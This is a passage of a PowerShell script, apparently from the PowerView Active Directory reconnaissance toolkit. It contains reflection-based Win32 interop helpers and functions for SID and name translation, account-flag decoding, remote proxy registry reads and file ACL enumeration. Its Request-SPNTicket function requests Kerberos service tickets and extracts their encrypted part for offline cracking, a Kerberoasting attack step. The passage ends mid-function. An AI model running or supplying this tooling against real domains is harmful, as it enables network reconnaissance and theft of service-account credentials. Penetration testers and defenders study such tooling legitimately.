











function New-InMemoryModule
{


    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()

    ForEach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = [AppDomain]::CurrentDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}




function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            
            $i = 1
            ForEach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $Null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        ForEach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum
{


    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    ForEach ($Key in $EnumElements.Keys)
    {
        
        $Null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}




function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{


    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    
    
    
    ForEach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    ForEach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    
    
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    
    
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}








filter Get-IniContent {

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [Alias('FullName')]
        [ValidateScript({ Test-Path -Path $_ })]
        [String[]]
        $Path
    )

    ForEach($TargetPath in $Path) {
        $IniObject = @{}
        Switch -Regex -File $TargetPath {
            "^\[(.+)\]" 
            {
                $Section = $matches[1].Trim()
                $IniObject[$Section] = @{}
                $CommentCount = 0
            }
            "^(;.*)$" 
            {
                $Value = $matches[1].Trim()
                $CommentCount = $CommentCount + 1
                $Name = 'Comment' + $CommentCount
                $IniObject[$Section][$Name] = $Value
            } 
            "(.+?)\s*=(.*)" 
            {
                $Name, $Value = $matches[1..2]
                $Name = $Name.Trim()
                $Values = $Value.split(',') | ForEach-Object {$_.Trim()}
                if($Values -isnot [System.Array]) {$Values = @($Values)}
                $IniObject[$Section][$Name] = $Values
            }
        }
        $IniObject
    }
}

filter Export-PowerViewCSV {

    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,

        [Parameter(Mandatory=$True, Position=0)]
        [String]
        [ValidateNotNullOrEmpty()]
        $OutFile
    )

    $ObjectCSV = $InputObject | ConvertTo-Csv -NoTypeInformation

    
    $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex';
    $Null = $Mutex.WaitOne()

    if (Test-Path -Path $OutFile) {
        
        $ObjectCSV | ForEach-Object { $Start=$True }{ if ($Start) {$Start=$False} else {$_} } | Out-File -Encoding 'ASCII' -Append -FilePath $OutFile
    }
    else {
        $ObjectCSV | Out-File -Encoding 'ASCII' -Append -FilePath $OutFile
    }

    $Mutex.ReleaseMutex()
}


filter Get-IPAddress {


    [CmdletBinding()]
    param(
        [Parameter(Position=0, ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = $Env:ComputerName
    )

    try {
        
        $Computer = $ComputerName | Get-NameField

        
        @(([Net.Dns]::GetHostEntry($Computer)).AddressList) | ForEach-Object {
            if ($_.AddressFamily -eq 'InterNetwork') {
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ComputerName' $Computer
                $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                $Out
            }
        }
    }
    catch {
        Write-Verbose -Message 'Could not resolve host to an IP Address.'
    }
}


filter Convert-NameToSid {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        [Alias('Name')]
        $ObjectName,

        [String]
        $Domain
    )

    $ObjectName = $ObjectName -Replace "/","\"
    
    if($ObjectName.Contains("\")) {
        
        $Domain = $ObjectName.Split("\")[0]
        $ObjectName = $ObjectName.Split("\")[1]
    }
    elseif(-not $Domain) {
        $Domain = (Get-NetDomain).Name
    }

    try {
        $Obj = (New-Object System.Security.Principal.NTAccount($Domain, $ObjectName))
        $SID = $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
        
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ObjectName' $ObjectName
        $Out | Add-Member Noteproperty 'SID' $SID
        $Out
    }
    catch {
        Write-Verbose "Invalid object/name: $Domain\$ObjectName"
        $Null
    }
}


filter Convert-SidToName {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        [ValidatePattern('^S-1-.*')]
        $SID
    )

    try {
        $SID2 = $SID.trim('*')

        
        
        Switch ($SID2) {
            'S-1-0'         { 'Null Authority' }
            'S-1-0-0'       { 'Nobody' }
            'S-1-1'         { 'World Authority' }
            'S-1-1-0'       { 'Everyone' }
            'S-1-2'         { 'Local Authority' }
            'S-1-2-0'       { 'Local' }
            'S-1-2-1'       { 'Console Logon ' }
            'S-1-3'         { 'Creator Authority' }
            'S-1-3-0'       { 'Creator Owner' }
            'S-1-3-1'       { 'Creator Group' }
            'S-1-3-2'       { 'Creator Owner Server' }
            'S-1-3-3'       { 'Creator Group Server' }
            'S-1-3-4'       { 'Owner Rights' }
            'S-1-4'         { 'Non-unique Authority' }
            'S-1-5'         { 'NT Authority' }
            'S-1-5-1'       { 'Dialup' }
            'S-1-5-2'       { 'Network' }
            'S-1-5-3'       { 'Batch' }
            'S-1-5-4'       { 'Interactive' }
            'S-1-5-6'       { 'Service' }
            'S-1-5-7'       { 'Anonymous' }
            'S-1-5-8'       { 'Proxy' }
            'S-1-5-9'       { 'Enterprise Domain Controllers' }
            'S-1-5-10'      { 'Principal Self' }
            'S-1-5-11'      { 'Authenticated Users' }
            'S-1-5-12'      { 'Restricted Code' }
            'S-1-5-13'      { 'Terminal Server Users' }
            'S-1-5-14'      { 'Remote Interactive Logon' }
            'S-1-5-15'      { 'This Organization ' }
            'S-1-5-17'      { 'This Organization ' }
            'S-1-5-18'      { 'Local System' }
            'S-1-5-19'      { 'NT Authority' }
            'S-1-5-20'      { 'NT Authority' }
            'S-1-5-80-0'    { 'All Services ' }
            'S-1-5-32-544'  { 'BUILTIN\Administrators' }
            'S-1-5-32-545'  { 'BUILTIN\Users' }
            'S-1-5-32-546'  { 'BUILTIN\Guests' }
            'S-1-5-32-547'  { 'BUILTIN\Power Users' }
            'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
            'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
            'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
            'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
            'S-1-5-32-552'  { 'BUILTIN\Replicators' }
            'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
            'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
            'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
            'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
            'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
            'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
            'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
            'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
            'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
            'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
            'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
            'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
            'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
            'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
            'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
            'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
            'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
            'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
            Default { 
                $Obj = (New-Object System.Security.Principal.SecurityIdentifier($SID2))
                $Obj.Translate( [System.Security.Principal.NTAccount]).Value
            }
        }
    }
    catch {
        Write-Verbose "Invalid SID: $SID"
        $SID
    }
}


filter Convert-ADName {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $ObjectName,

        [String]
        [ValidateSet("NT4","Simple","Canonical")]
        $InputType,

        [String]
        [ValidateSet("NT4","Simple","Canonical")]
        $OutputType
    )

    $NameTypes = @{
        'Canonical' = 2
        'NT4'       = 3
        'Simple'    = 5
    }

    if(-not $PSBoundParameters['InputType']) {
        if( ($ObjectName.split('/')).Count -eq 2 ) {
            $ObjectName = $ObjectName.replace('/', '\')
        }

        if($ObjectName -match "^[A-Za-z]+\\[A-Za-z ]+") {
            $InputType = 'NT4'
        }
        elseif($ObjectName -match "^[A-Za-z ]+@[A-Za-z\.]+") {
            $InputType = 'Simple'
        }
        elseif($ObjectName -match "^[A-Za-z\.]+/[A-Za-z]+/[A-Za-z/ ]+") {
            $InputType = 'Canonical'
        }
        else {
            Write-Warning "Can not identify InType for $ObjectName"
            return $ObjectName
        }
    }
    elseif($InputType -eq 'NT4') {
        $ObjectName = $ObjectName.replace('/', '\')
    }

    if(-not $PSBoundParameters['OutputType']) {
        $OutputType = Switch($InputType) {
            'NT4' {'Canonical'}
            'Simple' {'NT4'}
            'Canonical' {'NT4'}
        }
    }

    
    $Domain = Switch($InputType) {
        'NT4' { $ObjectName.split("\")[0] }
        'Simple' { $ObjectName.split("@")[1] }
        'Canonical' { $ObjectName.split("/")[0] }
    }

    
    function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {
        $Output = $Object.GetType().InvokeMember($Method, "InvokeMethod", $Null, $Object, $Parameters)
        if ( $Output ) { $Output }
    }
    function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {
        [Void] $Object.GetType().InvokeMember($Property, "SetProperty", $Null, $Object, $Parameters)
    }

    $Translate = New-Object -ComObject NameTranslate

    try {
        Invoke-Method $Translate "Init" (1, $Domain)
    }
    catch [System.Management.Automation.MethodInvocationException] { 
        Write-Verbose "Error with translate init in Convert-ADName: $_"
    }

    Set-Property $Translate "ChaseReferral" (0x60)

    try {
        Invoke-Method $Translate "Set" ($NameTypes[$InputType], $ObjectName)
        (Invoke-Method $Translate "Get" ($NameTypes[$OutputType]))
    }
    catch [System.Management.Automation.MethodInvocationException] {
        Write-Verbose "Error with translate Set/Get in Convert-ADName: $_"
    }
}


function ConvertFrom-UACValue {

    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        $Value,

        [Switch]
        $ShowAll
    )

    begin {
        
        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
        $UACValues.Add("SCRIPT", 1)
        $UACValues.Add("ACCOUNTDISABLE", 2)
        $UACValues.Add("HOMEDIR_REQUIRED", 8)
        $UACValues.Add("LOCKOUT", 16)
        $UACValues.Add("PASSWD_NOTREQD", 32)
        $UACValues.Add("PASSWD_CANT_CHANGE", 64)
        $UACValues.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $UACValues.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $UACValues.Add("NORMAL_ACCOUNT", 512)
        $UACValues.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $UACValues.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $UACValues.Add("SERVER_TRUST_ACCOUNT", 8192)
        $UACValues.Add("DONT_EXPIRE_PASSWORD", 65536)
        $UACValues.Add("MNS_LOGON_ACCOUNT", 131072)
        $UACValues.Add("SMARTCARD_REQUIRED", 262144)
        $UACValues.Add("TRUSTED_FOR_DELEGATION", 524288)
        $UACValues.Add("NOT_DELEGATED", 1048576)
        $UACValues.Add("USE_DES_KEY_ONLY", 2097152)
        $UACValues.Add("DONT_REQ_PREAUTH", 4194304)
        $UACValues.Add("PASSWORD_EXPIRED", 8388608)
        $UACValues.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $UACValues.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }

    process {

        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary

        if($Value -is [Int]) {
            $IntValue = $Value
        }
        elseif ($Value -is [PSCustomObject]) {
            if($Value.useraccountcontrol) {
                $IntValue = $Value.useraccountcontrol
            }
        }
        else {
            Write-Warning "Invalid object input for -Value : $Value"
            return $Null 
        }

        if($ShowAll) {
            foreach ($UACValue in $UACValues.GetEnumerator()) {
                if( ($IntValue -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)+")
                }
                else {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        else {
            foreach ($UACValue in $UACValues.GetEnumerator()) {
                if( ($IntValue -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        $ResultUACValues
    }
}


filter Get-Proxy {

    param(
        [Parameter(ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $ENV:COMPUTERNAME
    )

    try {
        $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $ComputerName)
        $RegKey = $Reg.OpenSubkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")
        $ProxyServer = $RegKey.GetValue('ProxyServer')
        $AutoConfigURL = $RegKey.GetValue('AutoConfigURL')

        $Wpad = ""
        if($AutoConfigURL -and ($AutoConfigURL -ne "")) {
            try {
                $Wpad = (New-Object Net.Webclient).DownloadString($AutoConfigURL)
            }
            catch {
                Write-Warning "Error connecting to AutoConfigURL : $AutoConfigURL"
            }
        }
        
        if($ProxyServer -or $AutoConfigUrl) {

            $Properties = @{
                'ProxyServer' = $ProxyServer
                'AutoConfigURL' = $AutoConfigURL
                'Wpad' = $Wpad
            }
            
            New-Object -TypeName PSObject -Property $Properties
        }
        else {
            Write-Warning "No proxy settings found for $ComputerName"
        }
    }
    catch {
        Write-Warning "Error enumerating proxy settings for $ComputerName : $_"
    }
}


function Request-SPNTicket {


    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        
        [Alias('EncryptedPart')]
        [Switch]
        $EncPart
    )

    begin {
        Add-Type -AssemblyName System.IdentityModel
    }

    process {
        ForEach($UserSPN in $SPN) {
            Write-Verbose "Requesting ticket for: $UserSPN"
            if (!$EncPart) {
                New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            }
            else {
                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
                $TicketByteStream = $Ticket.GetRequest()
                if ($TicketByteStream)
                {
                    $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace "-"
                    [System.Collections.ArrayList]$Parts = ($TicketHexStream -replace '^(.*?)04820...(.*)','$2') -Split "A48201"
                    $Parts.RemoveAt($Parts.Count - 1)
                    $Parts -join "A48201"
                    break
                }
            }
        }
    }
}


function Get-PathAcl {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $Path,

        [Switch]
        $Recurse
    )

    begin {

        function Convert-FileRight {

            

            [CmdletBinding()]
            param(
                [Int]
                $FSR
            )

            $AccessMask = @{
              [uint32]'0x80000000' = 'GenericRead'
              [uint32]'0x40000000' = 'GenericWrite'
              [uint32]'0x20000000' = 'GenericExecute'
              [uint32]'0x10000000' = 'GenericAll'
              [uint32]'0x02000000' = 'MaximumAllowed'
              [uint32]'0x01000000' = 'AccessSystemSecurity'
              [uint32]'0x00100000' = 'Synchronize'
              [uint32]'0x00080000' = 'WriteOwner'
              [uint32]'0x00040000' = 'WriteDAC'
              [uint32]'0x00020000' = 'ReadControl'
              [uint32]'0x00010000' = 'Delete'
              [uint32]'0x00000100' = 'WriteAttributes'
              [uint32]'0x00000080' = 'ReadAttributes'
              [uint32]'0x00000040' = 'DeleteChild'
              [uint32]'0x00000020' = 'Execute/Traverse'
              [uint32]'0x00000010' = 'WriteExtendedAttributes'
              [uint32]'0x00000008' = 'ReadExtendedAttributes'
              [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
              [uint32]'0x00000002' = 'WriteData/AddFile'
              [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            $SimplePermissions = @{
              [uint32]'0x1f01ff' = 'FullControl'
              [uint32]'0x0301bf' = 'Modify'
              [uint32]'0x0200a9' = 'ReadAndExecute'
              [uint32]'0x02019f' = 'ReadAndWrite'
              [uint32]'0x020089' = 'Read'
              [uint32]'0x000116' = 'Write'
            }

            $Permissions = @()

            
            $Permissions += $SimplePermissions.Keys |  % {
                              if (($FSR -band $_) -eq $_) {
                                $SimplePermissions[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }

            
            $Permissions += $AccessMask.Keys |
                            ? { $FSR -band $_ } |
                            % { $AccessMask[$_] }

            ($Permissions | ?{$_}) -join ","
        }
    }

    process {

        try {
            $ACL = Get-Acl -Path $Path

            $ACL.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | ForEach-Object {

                $Names = @()
                if ($_.IdentityReference -match '^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+') {
                    $Object = Get-ADObject -SID $_.IdentityReference
                    $Names = @()
                    $SIDs = @($Object.objectsid)

                    if ($Recurse -and (@('268435456','268435457','536870912','536870913') -contains $Object.samAccountType)) {
                        $SIDs += Get-NetGroupMember -SID $Object.objectsid | Select-Object -ExpandProperty MemberSid
                    }

                    $SIDs | ForEach-Object {
                        $Names += ,@($_, (Convert-SidToName $_))
                    }
                }
                else {
                    $Names += ,@($_.IdentityReference.Value, (Convert-SidToName $_.IdentityReference.Value))
                }

                ForEach($Name in $Names) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $Path
                    $Out | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name[1]
                    $Out | Add-Member Noteproperty 'IdentitySID' $Name[0]
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out
                }
            }
        }
        catch {
            Write-Warning $_
        }
    }
}


filter Get-NameField {

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Object]
        $Object,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [String]
        $DnsHostName,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [String]
        $Name
    )

    if($PSBoundParameters['DnsHostName']) {
        $DnsHostName
    }
    elseif($PSBoundParameters['Name']) {
        $Name
    }
    elseif($Object) {
        if ( [bool]($Object.PSobject.Properties.name -match "dnshostname") ) {
            
            $Object.dnshostname
        }
        elseif ( [bool]($Object.PSobject.Properties.name -match "name") ) {
            
            $Object.name
        }
        else {
            
            $Object
        }
    }
    else {
        return $Null
    }
}


function Convert-LDAPProperty {

    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if (($_ -eq "objectsid") -or ($_ -eq "sidhistory")) {
            
            $ObjectProperties[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value
        }
        elseif($_ -eq "objectguid") {
            
            $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
        }
        elseif( ($_ -eq "lastlogon") -or ($_ -eq "lastlogontimestamp") -or ($_ -eq "pwdlastset") -or ($_ -eq "lastlogoff") -or ($_ -eq "badPasswordTime") ) {
            
            if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                
                $Temp = $Properties[$_][0]
                [Int32]$High = $Temp.GetType().InvokeMember("HighPart", [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember("LowPart",  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
            }
            else {
                $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
            }
        }
        elseif($Properties[$_][0] -is [System.MarshalByRefObject]) {
            
